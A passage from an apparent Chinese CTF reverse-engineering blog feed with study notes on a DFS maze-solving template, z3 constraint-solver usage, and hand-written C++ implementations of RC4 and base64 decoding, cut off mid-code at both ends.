class="comment">//对x进行移动</span></span><br><span class="line"><span class="type">int</span> qy=dy[i]+y;<span class="comment">//对y进行移动</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">check</span>(qx,qy))&#123;<span class="comment">//检查移动之后的点是否合法（在进入移动后的点的dfs之前检查）</span></span><br><span class="line">            <span class="comment">//其实这里还有一种方法就是不在这里检查，</span></span><br><span class="line">            <span class="comment">//而是在进入当前点的dfs函数之后检查</span></span><br><span class="line">            <span class="comment">//但是这一种方法笔者经常容易和这个代码的方法混用</span></span><br><span class="line">            <span class="comment">//因此笔者决定以后都用这个方法</span></span><br><span class="line">t[r]=op[i];<span class="comment">//记录操作</span></span><br><span class="line">r++; <span class="comment">//路径长度增加</span></span><br><span class="line">map[x][y]=<span class="string">&#x27;1&#x27;</span>;<span class="comment">//这是重点！！！</span></span><br><span class="line">            <span class="comment">//标记当前位置已经走过</span></span><br><span class="line"><span class="built_in">dfs</span>(qx,qy); <span class="comment">//进入这个移动之后的点的dfs函数</span></span><br><span class="line">map[x][y]=<span class="string">&#x27;0&#x27;</span>; <span class="comment">//回溯，从这里往后的代码要和前面的代码一一对应,</span></span><br><span class="line">            <span class="comment">//顺序相反，反向操作</span></span><br><span class="line">            <span class="comment">//因为dfs(qx,qy)函数出来之后</span></span><br><span class="line">            <span class="comment">//从(x,y)向(qx,qy)的之后的所有路径已经全部被执行完了</span></span><br><span class="line">            <span class="comment">//因此要将所有的东西全部修复为从(x,y)移动之前的状态</span></span><br><span class="line">r--;</span><br><span class="line">t[r]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">31</span>;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">31</span>;j++)&#123;</span><br><span class="line"><span class="comment">//cout&lt;&lt;Map[1100*i+j];</span></span><br><span class="line">map[i][j]=Map[<span class="number">1100</span>*i+j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">31</span>;i++)&#123;<span class="comment">//输出迷宫图案 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">31</span>;j++)&#123;</span><br><span class="line"> cout&lt;&lt;map[i][j]&lt;&lt;<span class="string">&quot;  &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">1</span>);<span class="comment">//调用深搜函数 </span></span><br><span class="line"><span class="comment">/*int sx=1,sy=1;//这里是手动检验 </span></span><br><span class="line"><span class="comment">while(1)&#123;</span></span><br><span class="line"><span class="comment">char a;</span></span><br><span class="line"><span class="comment">cin&gt;&gt;a;</span></span><br><span class="line"><span class="comment">if(a==&#x27;a&#x27;)&#123;</span></span><br><span class="line"><span class="comment">sy--;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(a==&#x27;w&#x27;)&#123;</span></span><br><span class="line"><span class="comment">sx--;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(a==&#x27;s&#x27;)&#123;</span></span><br><span class="line"><span class="comment">sx++;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(a==&#x27;d&#x27;)&#123;</span></span><br><span class="line"><span class="comment">sy++;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">if(check(sx,sy))&#123;</span></span><br><span class="line"><span class="comment">cout&lt;&lt;&quot;yes&quot;&lt;&lt;&quot; &quot;&lt;&lt;sx&lt;&lt;&quot; &quot;&lt;&lt;sy&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">else cout&lt;&lt;&quot;no&quot;&lt;&lt;&quot; &quot;&lt;&lt;sx&lt;&lt;&quot; &quot;&lt;&lt;sy&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfs处的代码我已经全部给写了注释</p><p>在此总结一下走迷宫用的dfs函数的模板</p><h2 id="dfs函数前的处理"><a href="#dfs函数前的处理" class="headerlink" title="dfs函数前的处理"></a>dfs函数前的处理</h2><ul><li>要定义几个数组，用来表示向不同方向移动时x和y的变化量，这里就是dx[4]和dy[4]</li><li>定义一个长度会随着dfs函数深入而边长的数组，用来记录移动操作所要输入的字符，可以用vector，也可以像我一样定义一个长度和一个足够长的数组，这里就是r和t[1000]</li><li>和上一点相对应的，也要有一个表示向不同方向移动时所要输入的字符数组，必须要和dx和dy数组所表示的方向一致</li><li>定义一个二维数组，用来记录是否已经走过。这个数组可以和原来的地图数组相重合，具体看情况，这里就是<code>map[31][31]</code>。这个数组非常重要，如果没有这个数组，你dfs就会往回走！</li><li>定义一个check(int x,int y)的函数，用来检验这个移动之后的点是否合法</li></ul><h2 id="dfs内部实现"><a href="#dfs内部实现" class="headerlink" title="dfs内部实现"></a>dfs内部实现</h2><h3 id="终点处理"><a href="#终点处理" class="headerlink" title="终点处理"></a>终点处理</h3><p>首先要进行是否是终点的判断，如果是终点，就要输出之前所记录的全部路径</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(map[x][y]==<span class="string">&#x27;T&#x27;</span>)&#123;<span class="comment">//找到终点了！</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;r;i++)cout&lt;&lt;t[i];</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;r;</span><br><span class="line">cout&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="向不同方向延伸的循环"><a href="#向不同方向延伸的循环" class="headerlink" title="向不同方向延伸的循环"></a>向不同方向延伸的循环</h3><p>在这个循环中，要先进行x和y的变化，再检查移动之后的坐标是否合法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> qx=dx[i]+x;<span class="comment">//对x进行移动</span></span><br><span class="line"><span class="type">int</span> qy=dy[i]+y;<span class="comment">//对y进行移动</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">check</span>(qx,qy))&#123;</span><br></pre></td></tr></table></figure><p>如果移动之后的点合法，那我们就要正式的移动了，移动前，我们要先将路径数组给记录上</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">t[r]=op[i];<span class="comment">//记录操作</span></span><br><span class="line">r++; <span class="comment">//路径长度增加</span></span><br></pre></td></tr></table></figure><p>然后再记录这个点被我们走过了</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map[x][y]=<span class="string">&#x27;1&#x27;</span>;<span class="comment">//这是重点！！！</span></span><br><span class="line">            <span class="comment">//标记当前位置已经走过</span></span><br></pre></td></tr></table></figure><p>当然以上两个操作可以颠倒，但是第一个操作（记录路径）的顺序不能颠倒，读者可以考虑一下为什么</p><p>之后就正式的走这个点了</p><p><code> dfs(qx,qy)</code></p><p>在这里不对递归的实现进行讲解，读者请自行了解（其实就是在函数里又调用了一个函数，只不过恰巧是当前这个函数而已）</p><p>所要注意的是，dfs(qx,qy) 函数调用完成后，就表明从(x,y)到（qx,qy）以及之后的路径已经全部执行完了</p><p>因此之后就要回溯，将我们之前的操作都还原</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map[x][y]=<span class="string">&#x27;0&#x27;</span>; <span class="comment">//回溯，从这里往后的代码要和前面的代码一一对应,</span></span><br><span class="line">            <span class="comment">//顺序相反，反向操作</span></span><br><span class="line">            <span class="comment">//因为dfs(qx,qy)函数出来之后</span></span><br><span class="line">            <span class="comment">//从(x,y)向(qx,qy)的之后的所有路径已经全部被执行完了</span></span><br><span class="line">            <span class="comment">//因此要将所有的东西全部修复为从(x,y)移动之前的状态</span></span><br><span class="line">r--;</span><br><span class="line">t[r]=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h3 id="dfs调用"><a href="#dfs调用" class="headerlink" title="dfs调用"></a>dfs调用</h3><p>我们这个dfs调用只需要从起点开始执行即可。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">1</span>);<span class="comment">//调用深搜函数</span></span><br></pre></td></tr></table></figure><p>以上就是一个走迷宫所要使用的dfs函数模板了，我们之后再依照WolvCTF中的ej题目进行讲解</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dfs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>z3库的学习</title>
      <link href="/2023/03/14/2023-03-14-z3%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%9C%A8RE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2023/03/14/2023-03-14-z3%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%9C%A8RE%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="z3库的安装"><a href="#z3库的安装" class="headerlink" title="z3库的安装"></a>z3库的安装</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install z3_solver</span><br></pre></td></tr></table></figure><p>注意要安装z3_solver库而不是z3</p><h1 id="z3的作用"><a href="#z3的作用" class="headerlink" title="z3的作用"></a>z3的作用</h1><p>用于约束求解。</p><p>如果你已经知道了变量需要满足的若干条件，但是不想写for循环的暴力，那么就可以用这个库，你只需要告诉他变量需要满足的条件，它就可以告诉你满足条件的若干变量。</p><h1 id="z3的基本使用模板"><a href="#z3的基本使用模板" class="headerlink" title="z3的基本使用模板"></a>z3的基本使用模板</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a=Int(<span class="string">&#x27;a&#x27;</span>)  <span class="comment">#定义单个int型变量</span></span><br><span class="line">b,c,d=Ints(<span class="string">&#x27;b c d&#x27;</span>) <span class="comment">#定义多个int型变量</span></span><br><span class="line">s=Solver() <span class="comment">#定义一个约束器</span></span><br><span class="line">s.add(a+b==<span class="number">10</span>,b-c==<span class="number">7</span>)<span class="comment">#添加约束条件,可以添加多个，也可以添加一个</span></span><br><span class="line">s.add(a+c!=<span class="number">5</span>)<span class="comment">#s.add可以多次使用</span></span><br><span class="line"><span class="built_in">print</span>(s.check())<span class="comment">#check就是求解，有解的话返回sat，无解返回unsat</span></span><br><span class="line"><span class="built_in">print</span>(s.model())<span class="comment">#输出解，注意输出的时候不按照定义的顺序来，可以认为输出是无序的</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sat</span></span><br><span class="line"><span class="string">[c = 0, a = 3, b = 7]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="这些模板中一些特殊的地方"><a href="#这些模板中一些特殊的地方" class="headerlink" title="这些模板中一些特殊的地方"></a>这些模板中一些特殊的地方</h1><h2 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h2><ol><li><p>上面的模板中展示了int型变量的定义方法，但是要注意，int型变量无法使用位运算，如^ &amp; |。</p></li><li><p>如果想用位运算怎么办？那就定义位向量 </p><p><code>a, b, c=BitVecs(&#39;a b c&#39;,32)</code></p><p> <code>a=BitVecs(&#39;a&#39;,32)</code></p><p>以上就是定义位向量的方式，其中后面的参数指的是位向量的位数。</p><p>另外需要注意的一点是，位向量好像是不能使用乘法的，如果一定要使用的话，要先转化成int型再去使用</p><p>比如</p><p><code>s.add(5*BV2Int(a)%3==4)</code></p></li><li><p>在逆向中不常使用的变量定义方式还有一种，定义实数变量（小数）</p><p><code>y = Real(&#39;y&#39;)</code></p></li><li><p>如果想定义很多个变量怎么办？使用列表！</p><p><code>x =  [Int(&#39;x%s&#39; % i) for i in range(0x22) ] </code></p><p>如何使用？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 添加约束条件</span><br><span class="line"></span><br><span class="line">模板中添加的约束调价都是和的关系，也就是都要满足，但是有时候我们希望添加或的关系，那我们应该怎么办？</span><br><span class="line"></span><br><span class="line">``` s.add(Or(x + y &gt; 3, x - y &lt; 2))```</span><br><span class="line"></span><br><span class="line">这样就可以了</span><br><span class="line"></span><br><span class="line">## 输出</span><br><span class="line"></span><br><span class="line">在逆向中，我们计算出来的变量往往是一个ASCLL码，我们希望将它们转化成可视字符，那应该如何操作？</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">for i in range(0,32):      #添加可视化字符的约束条件</span><br><span class="line">    s.add(BV2Int(a1[i])&lt;127)</span><br><span class="line">    s.add(BV2Int(a1[i])&gt;31)</span><br><span class="line">s.check()</span><br><span class="line">m=s.model()</span><br><span class="line">#print(m)</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in range(0,32):</span><br><span class="line">    res+=(chr(m[a1[i]].as_long()))</span><br><span class="line">    </span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>值得注意的一点是，即使约束器求出来是多解，最终也只能输出一解，但是在逆向中往往只需要知道一个解就可以了（或者说题目条件的约束只能出来一个解），因此在本篇中本没有记录多解的输出方法。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见加密算法学习</title>
      <link href="/2023/03/11/2023-03-11-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/"/>
      <url>/2023/03/11/2023-03-11-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p><img src="/../imgs/202303111645239.png" alt="130035028553414"></p><p>特征：分组密码、对称加密，算法复杂、密钥长度有多种可能，最常见的是128bits，也就是16个字节。</p><p>b站视频学习AES加密过程：</p><blockquote><p><a href="https://www.bilibili.com/video/BV1i341187fK/?spm_id_from=333.337.search-card.all.click&vd_source=a85daf8eb54f32264d9f6976d087fe98">https://www.bilibili.com/video/BV1i341187fK/?spm_id_from=333.337.search-card.all.click&amp;vd_source=a85daf8eb54f32264d9f6976d087fe98</a></p></blockquote><p>AES加解密代码实现学习：</p><blockquote><p><a href="https://ppppz.net/2022/01/31/AES-P-Z/">https://ppppz.net/2022/01/31/AES-P-Z/</a></p></blockquote><p>（PZ大佬的博客链接）</p><p>本人最开始是想自己写的，后来实在不想debug了，于是就抄下了大佬的代码。</p><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><ul><li>流密码、对称加密、加解密使用同一种算法（最后使用了xor)</li><li>有一个s[] 作为黑盒，利用密钥对黑盒进行变换，使得黑盒中变得复杂(初始化)</li><li>最终使用黑盒中的数据对明文进行流加密，理论上来说明文密文是等长的</li><li>但是由于字符变量取值是0-127,但是密文的取值却是0-255,因此存在显示字符问题</li><li>在最终显示密文时可能存在几种情况，一种就是直接显示，可能会出现乱码，一种是用16进制进行输出，但这样会导致密文长度和明文长度不一致，另外一种就是使用base64编码输出，这样的话相当于进行了两次加密，但是密文一定可以很好地显示</li><li>特征代码 ：</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">i=(i<span class="number">+1</span>)%<span class="number">256</span>;</span><br><span class="line">j=(j+s[j])%<span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_start</span><span class="params">( <span class="type">char</span> key[],<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">s[i]=<span class="number">-1</span>-i;</span><br><span class="line">j=(j+s[i]+key[i%n])%<span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> secr[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rc4_enc</span><span class="params">( <span class="type">unsigned</span> <span class="type">char</span> pub[],<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;n;k++)&#123;</span><br><span class="line">i=(i<span class="number">+1</span>)%<span class="number">256</span>;</span><br><span class="line">j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> temp=s[(s[i]+s[j])%<span class="number">256</span>]^pub[k];</span><br><span class="line">secr[k]=temp;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="type">char</span> key[]=<span class="string">&quot;THISISAFAKEFLAG&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">rc4_start</span>(key,<span class="built_in">strlen</span>(key));</span><br><span class="line"></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">char</span> pub[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x44</span>, <span class="number">0x3F</span>, <span class="number">0x53</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x86</span>, <span class="number">0x3E</span>, <span class="number">0xAE</span>, <span class="number">0x55</span>, <span class="number">0xBE</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>&#125;; </span><br><span class="line"><span class="built_in">rc4_enc</span>(pub,<span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)cout&lt;&lt;secr[i];</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面为自己手写的代码。</p><p>其加解密完全使用同样的算法。</p><h1 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h1><ul><li>无密钥，加密过程中信息无丢失</li><li>将三个字符的字节（24位）划分成四个字符的字节，每一个字节为6位，高两位补2个0</li><li>加解密简单</li><li>特征代码：</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">b1=c1&gt;&gt;<span class="number">2</span>;</span><br><span class="line">b2=((c1&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">4</span>)|(c2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">b3=((c2&amp;<span class="number">0xF</span>)&lt;&lt;<span class="number">2</span>)|(c3&gt;&gt;<span class="number">6</span>);</span><br><span class="line">b4=c3&amp;<span class="number">0x3F</span>;</span><br></pre></td></tr></table></figure><p>以下为本人手写解密算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> <span class="comment">// base64 解密</span></span><br><span class="line"><span class="type">char</span> base64t[<span class="number">64</span>]=&#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;alter;   </span><br><span class="line"><span class="type">int</span> r=<span class="number">0</span>;     </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">change</span><span class="params">(<span class="type">char</span>* c1,<span class="type">char</span>*c2,<span class="type">char</span> *c3,<span class="type">char</span> *c4)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a1,a2,a3,a4,b1,b2,b3,b4;</span><br><span class="line">b1=*c1;</span><br><span class="line">b2=*c2;</span><br><span class="line">b3=*c3;</span><br><span class="line">b4=*c4;</span><br><span class="line">b1=alter[(<span class="type">char</span>)b1];</span><br><span class="line">b2=alter[(<span class="type">char</span>)b2];</span><br><span class="line">b3=alter[(<span class="type">char</span>)b3];</span><br><span class="line">b4=alter[(<span class="type">char</span>)b4];</span><br><span class="line"><span class="comment">//cout&lt;&lt;b1&lt;&lt;&quot; &quot;&lt;&lt;b2&lt;&lt;&quot; &quot;&lt;&lt;b3&lt;&lt;&quot; &quot;&lt;&lt;b4&lt;&lt;endl;</span></span><br><span class="line">a1=((b1&lt;&lt;<span class="number">2</span>)%<span class="number">256</span>)+(b2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">a2=((b2&lt;&lt;<span class="number">4</span>)%<span class="number">256</span>)+(b3&gt;&gt;<span class="number">2</span>);</span><br><span class="line">a3=((b3&lt;&lt;<span class="number">6</span>)%<span class="number">256</span>)+b4;</span><br><span class="line"><span class="comment">//cout&lt;&lt;a1&lt;&lt;&quot; &quot;&lt;&lt;a2&lt;&lt;&quot; &quot;&lt;&lt;a3&lt;&lt;endl;</span></span><br><span class="line">*c1=a1;</span><br><span class="line">*c2=a2;</span><br><span class="line">*c3=a3;</span><br><span class="line">*c4=<span class="number">0</span>; </span><br><span class="line">&#125;      </span><br><span class="line">vector&lt;<span class="type">char</span>&gt;ans;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">endw</span><span class="params">(<span class="type">char</span>* c1,<span class="type">char</span>*c2,<span class="type">char</span> *c3,<span class="type">char</span> *c4)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a1,b1,a2,b2,a3,b3,a4,b4;</span><br><span class="line">b1=*c1;</span><br><span class="line">b2=*c2;</span><br><span class="line">b3=*c3;</span><br><span class="line">b4=*c4;</span><br><span class="line"><span class="keyword">if</span>(b4!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">b1=alter[(<span class="type">char</span>)b1];</span><br><span class="line">b2=alter[(<span class="type">char</span>)b2];</span><br><span class="line">b3=alter[(<span class="type">char</span>)b3];</span><br><span class="line">b4=alter[(<span class="type">char</span>)b4];</span><br><span class="line"><span class="comment">//cout&lt;&lt;b1&lt;&lt;&quot; &quot;&lt;&lt;b2&lt;&lt;&quot; &quot;&lt;&lt;b3&lt;&lt;&quot; &quot;&lt;&lt;b4&lt;&lt;endl;</span></span><br><span class="line">a1=((b1&lt;&lt;<span class="number">2</span>)%<span class="number">256</span>)+(b2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">a2=((b2&lt;&lt;<span class="number">4</span>)%<span class="number">256</span>)+(b3&gt;&gt;<span class="number">2</span>);</span><br><span class="line">a3=((b3&lt;&lt;<span class="number">6</span>)%<span class="number">256</span>)+b4;</span><br><span class="line">r+=<span class="number">3</span>;</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a1));</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a2));</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a3));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b4==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(b3==<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">b1=alter[(<span class="type">char</span>)b1];</span><br><span class="line">b2=alter[(<span class="type">char</span>)b2];</span><br><span class="line">r+=<span class="number">1</span>;</span><br><span class="line">a1=((b1&lt;&lt;<span class="number">2</span>)%<span class="number">256</span>)+(b2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a1));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(b3!=<span class="string">&#x27;=&#x27;</span>)&#123;</span><br><span class="line">b1=alter[(<span class="type">char</span>)b1];</span><br><span class="line">b2=alter[(<span class="type">char</span>)b2];</span><br><span class="line">b3=alter[(<span class="type">char</span>)b3];</span><br><span class="line">r+=<span class="number">2</span>;</span><br><span class="line">a1=((b1&lt;&lt;<span class="number">2</span>)%<span class="number">256</span>)+(b2&gt;&gt;<span class="number">4</span>);</span><br><span class="line">a2=((b2&lt;&lt;<span class="number">4</span>)%<span class="number">256</span>)+(b3&gt;&gt;<span class="number">2</span>);</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a1));</span><br><span class="line">ans.<span class="built_in">push_back</span>(<span class="built_in">char</span>(a2));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 